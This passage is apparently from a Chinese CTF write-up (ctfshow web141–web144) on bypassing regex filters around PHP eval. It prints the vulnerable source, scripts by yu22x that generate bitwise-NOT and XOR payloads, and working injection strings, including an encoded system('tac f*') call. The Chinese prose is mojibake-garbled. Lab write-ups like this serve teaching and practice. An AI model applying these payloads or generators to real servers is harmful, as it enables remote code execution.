</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^\W+$/&#39;</span><span class="p">,</span> <span class="nv">$v3</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">            <span class="nv">$code</span> <span class="o">=</span>  <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;return </span><span class="si">$v1$v3$v2</span><span class="s2">;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$v1$v3$v2</span><span class="s2"> = &#34;</span><span class="o">.</span><span class="nv">$code</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><pre tabindex="0"><code>preg_match(&#39;/^\W+$/&#39;, $v3)
</code></pre><p>æ­¤æ­£åˆ™è¡¨è¾¾å¼ç”¨äºæ£€æŸ¥å­—ç¬¦ä¸² <code>$v3</code> <strong>æ˜¯å¦å®Œå…¨ç”±éå•è¯å­—ç¬¦ç»„æˆ</strong>ï¼Œä¸”<strong>ä¸èƒ½ä¸ºç©º</strong>ã€‚ï¼ˆå•è¯å­—ç¬¦ï¼šå­—æ¯ã€æ•°å­—å’Œä¸‹åˆ’çº¿ï¼‰</p>
<p>æ ¹æ®é¢˜ç›®æˆ‘ä»¬å¯ä»¥è”æƒ³åˆ°å–åï¼Œæˆ–ï¼Œå¼‚æˆ–å‘½ä»¤æ‰§è¡Œï¼Œè¿™é‡Œéšä¾¿ä¸€ä¸ªéƒ½è¡Œ</p>
<blockquote>
<p>phpä¸­æœ‰ä¸ªæœ‰æ„æ€çš„åœ°æ–¹ï¼Œæ•°å­—æ˜¯å¯ä»¥å’Œå‘½ä»¤è¿›è¡Œä¸€äº›è¿ç®—çš„ï¼Œä¾‹å¦‚ 1-phpinfo();æ˜¯å¯ä»¥æ‰§è¡Œphpinfo()å‘½ä»¤çš„ã€‚è¿™æ ·å°±å¥½è¯´äº†ã€‚æ„é€ å‡º1-phpinfo()-1å°±å¯ä»¥äº†ï¼Œä¹Ÿå°±æ˜¯è¯´ v1=1&amp;v2=1&amp;v3=-phpinfo()-</p></blockquote>
<p>ç¾½å¸ˆå‚…æœ‰ä¸ªå–åè„šæœ¬</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="c1">//åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œ
</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm">/*author yu22x*/</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">fwrite</span><span class="p">(</span><span class="nx">STDOUT</span><span class="p">,</span><span class="s1">&#39;[+]your function: &#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="nv">$system</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">),</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">fgets</span><span class="p">(</span><span class="nx">STDIN</span><span class="p">));</span> 
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="nx">fwrite</span><span class="p">(</span><span class="nx">STDOUT</span><span class="p">,</span><span class="s1">&#39;[+]your command: &#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nv">$command</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">),</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">fgets</span><span class="p">(</span><span class="nx">STDIN</span><span class="p">));</span> 
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">echo</span> <span class="s1">&#39;[*] (~&#39;</span><span class="o">.</span><span class="nx">urlencode</span><span class="p">(</span><span class="o">~</span><span class="nv">$system</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;)(~&#39;</span><span class="o">.</span><span class="nx">urlencode</span><span class="p">(</span><span class="o">~</span><span class="nv">$command</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;);&#39;</span><span class="p">;</span>
</span></span></code></pre></div><p>ç›´æ¥ç”¨å°±è¡Œ</p>
<p><img alt="image-20250124220654185" loading="lazy" src="assets/image-20250124220654185.png"></p>
<p>payload:</p>
<pre tabindex="0"><code>?v1=1&amp;v2=1&amp;v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)-
</code></pre><h4 id="web142">web142<a hidden class="anchor" aria-hidden="true" href="#web142">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-17 19:36:02
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="nv">$d</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)(</span><span class="nv">$v1</span> <span class="o">*</span> <span class="mh">0x36d</span> <span class="o">*</span> <span class="mh">0x36d</span> <span class="o">*</span> <span class="mh">0x36d</span> <span class="o">*</span> <span class="mh">0x36d</span> <span class="o">*</span> <span class="mh">0x36d</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">sleep</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é¢˜å°±æ˜¯ä¸€ä¸ª$dç§’åå‡ºflagï¼Œç›´æ¥ä¼ å…¥v1=0ï¼Œç›´æ¥æ‹¿åˆ°flag</p>
<p>payload:</p>
<pre tabindex="0"><code>?v1=0
</code></pre><h4 id="web143">web143<a hidden class="anchor" aria-hidden="true" href="#web143">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-18 12:48:14
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$v3</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&amp;|\;/i&#39;</span><span class="p">,</span> <span class="nv">$v3</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">                <span class="k">die</span><span class="p">(</span><span class="s1">&#39;get out hacker!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">            <span class="nv">$code</span> <span class="o">=</span>  <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;return </span><span class="si">$v1$v3$v2</span><span class="s2">;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$v1$v3$v2</span><span class="s2"> = &#34;</span><span class="o">.</span><span class="nv">$code</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é¢˜banæ‰äº†å–åï¼Œåªèƒ½ç”¨å…¶ä»–ä½è¿ç®—ç¬¦æ„é€ payload</p>
<p>ç¾½å¸ˆå‚…çš„å¼‚æˆ–è„šæœ¬</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*author yu22x*/</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nv">$myfile</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;xor_rce.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nv">$contents</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$j</span> <span class="o">&lt;</span><span class="mi">256</span> <span class="p">;</span> <span class="nv">$j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
</span></span><span class="line"><span class="ln">10</span><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nv">$i</span><span class="o">&lt;</span><span class="mi">16</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">			<span class="nv">$hex_i</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="o">.</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">		<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">			<span class="nv">$hex_i</span><span class="o">=</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nv">$j</span><span class="o">&lt;</span><span class="mi">16</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">			<span class="nv">$hex_j</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="o">.</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$j</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">		<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">			<span class="nv">$hex_j</span><span class="o">=</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$j</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">		<span class="nv">$preg</span> <span class="o">=</span> <span class="s1">&#39;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&amp;|\;/i&#39;</span><span class="p">;</span> <span class="c1">//æ ¹æ®é¢˜ç›®ç»™çš„æ­£åˆ™è¡¨è¾¾å¼ä¿®æ”¹å³å¯
</span></span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="c1"></span>		<span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$preg</span> <span class="p">,</span> <span class="nx">hex2bin</span><span class="p">(</span><span class="nv">$hex_i</span><span class="p">))</span><span class="o">||</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$preg</span> <span class="p">,</span> <span class="nx">hex2bin</span><span class="p">(</span><span class="nv">$hex_j</span><span class="p">))){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">					<span class="k">echo</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">  
</span></span><span class="line"><span class="ln">27</span><span class="cl">		<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">		<span class="nv">$a</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="o">.</span><span class="nv">$hex_i</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">		<span class="nv">$b</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="o">.</span><span class="nv">$hex_j</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">		<span class="nv">$c</span><span class="o">=</span><span class="p">(</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span><span class="o">^</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">)</span><span class="o">&gt;=</span><span class="mi">32</span><span class="o">&amp;</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">)</span><span class="o">&lt;=</span><span class="mi">126</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">			<span class="nv">$contents</span><span class="o">=</span><span class="nv">$contents</span><span class="o">.</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &#34;</span><span class="o">.</span><span class="nv">$a</span><span class="o">.</span><span class="s2">&#34; &#34;</span><span class="o">.</span><span class="nv">$b</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">
</span></span><span class="line"><span class="ln">36</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="nx">fwrite</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">,</span><span class="nv">$contents</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="nx">fclose</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">);</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="c1"># author yu22x</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="kn">import</span> <span class="nn">urllib</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">def</span> <span class="nf">action</span><span class="p">(</span><span class="n">arg</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">   <span class="n">s1</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">   <span class="n">s2</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">   <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">arg</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">       <span class="n">f</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s2">&#34;xor_rce.txt&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">       <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">           <span class="n">t</span><span class="o">=</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">           <span class="k">if</span> <span class="n">t</span><span class="o">==</span><span class="s2">&#34;&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">               <span class="k">break</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">           <span class="k">if</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="n">i</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">               <span class="c1">#print(i)</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">               <span class="n">s1</span><span class="o">+=</span><span class="n">t</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">5</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">               <span class="n">s2</span><span class="o">+=</span><span class="n">t</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">9</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">               <span class="k">break</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">       <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">   <span class="n">output</span><span class="o">=</span><span class="s2">&#34;(</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">s1</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">^</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">s2</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">)&#34;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">   <span class="k">return</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">   
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">   <span class="n">param</span><span class="o">=</span><span class="n">action</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[+] your functionï¼š&#34;</span><span class="p">)</span> <span class="p">)</span><span class="o">+</span><span class="n">action</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;[+] your commandï¼š&#34;</span><span class="p">))</span><span class="o">+</span><span class="s2">&#34;;&#34;</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="n">param</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web144">web144<a hidden class="anchor" aria-hidden="true" href="#web144">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-18 16:21:15
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$v3</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">check</span><span class="p">(</span><span class="nv">$v3</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^\W+$/&#39;</span><span class="p">,</span> <span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="nv">$code</span> <span class="o">=</span>  <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;return </span><span class="si">$v1$v3$v2</span><span class="s2">;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$v1$v3$v2</span><span class="s2"> = &#34;</span><span class="o">.</span><span class="nv">$code</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="k">function</span> <span class="nf">check</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="k">return</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">===</span><span class="mi">1</span><span class="o">?</span><span class="k">true</span><span class="o">:</span><span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
